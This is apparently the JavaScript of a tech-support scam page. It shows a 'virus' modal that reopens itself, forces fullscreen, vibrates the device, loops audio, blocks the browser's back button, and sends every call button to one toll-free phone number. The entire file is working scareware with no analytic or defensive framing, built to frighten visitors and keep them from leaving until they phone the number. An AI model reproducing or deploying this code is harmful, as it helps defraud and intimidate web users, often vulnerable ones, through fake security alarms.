$(document).ready(() => {
    function startCountdown() {
      let timeInSeconds = 5 * 60; // 5 minutes in seconds
  
      const countdown = setInterval(() => {
        let minutes = Math.floor(timeInSeconds / 60);
        let seconds = timeInSeconds % 60;
  
        // Format minutes and seconds to always show 2 digits
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
  
        // Update the timer display
        document.getElementById(
          "countdown-timer"
        ).innerText = `${minutes}:${seconds}`;
  
        // Decrease time by 1 second
        timeInSeconds--;
  
        // When the countdown reaches 0, restart the timer
        if (timeInSeconds < 0) {
          clearInterval(countdown);
          startCountdown(); // Restart the countdown
        }
      }, 1000);
    }
  
    // Start the countdown
    startCountdown();
  
    const virusModal = document.getElementById("virusModal");
    const modalInstance = new bootstrap.Modal(virusModal);
    const audioPlayer = $("#audioPlayer")[0];
  
    audioPlayer.play();
  
    audioPlayer.addEventListener("ended", ()=> {
      audioPlayer.play();
    })
  
    // Function to go fullscreen
    function goFullScreenAndVibrate() {
      const element = document.documentElement; // Use the whole document for fullscreen
  
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) {
        // Firefox
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) {
        // Chrome, Safari and Opera
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) {
        // IE/Edge
        element.msRequestFullscreen();
      }
  
      navigator.vibrate(200);
      modalInstance.show(); // Show the modal
    }
  
    if (virusModal) {
      // Event listener for when modal is shown
      virusModal.addEventListener("show.bs.modal", (event) => {
        goFullScreenAndVibrate();
        audioPlayer.play();
  
        audioPlayer.addEventListener("ended", ()=> {
          audioPlayer.play();
        })
      });
  
      // Event listener for when modal is about to hide
      //   virusModal.addEventListener("hide.bs.modal", (event) => {
      //     console.log("Sagar");
      //   });
  
      // Event listener for when modal is completely hidden
      virusModal.addEventListener("hidden.bs.modal", (event) => {
        // Reopen the modal after 1 second
        setTimeout(() => {
          modalInstance.show();
          goFullScreenAndVibrate();
        }, 300); // 0.3 second delay
      });
    }
  
    window.addEventListener("touchstart", () => {
      if (virusModal) {
        goFullScreenAndVibrate();
      }
    });
  
    window.addEventListener("click", () => {
      if (virusModal) {
        goFullScreenAndVibrate();
      }
    });
  
    // Add event listener for button vibration
    $("#vibrateButton").on("click", () => {
      goFullScreenAndVibrate();
    });
  
    // Add event listener for button vibration
    $("#callButton").on("click", () => {
      // Replace with the desired phone number
      const phoneNumber = "tel:+18778381219";
      window.location.href = phoneNumber;
    });
    $("#callButton1").on("click", () => {
      // Replace with the desired phone number
      const phoneNumber = "tel:+18778381219";
      window.location.href = phoneNumber;
    });
    $("#callButton2").on("click", () => {
      // Replace with the desired phone number
      const phoneNumber = "tel:+18778381219";
      window.location.href = phoneNumber;
    });
  
    // Prevent the backspace key from navigating back.
    history.pushState(null, null, window.location.href);
    history.back();
    window.onpopstate = () => history.forward();
  });
  
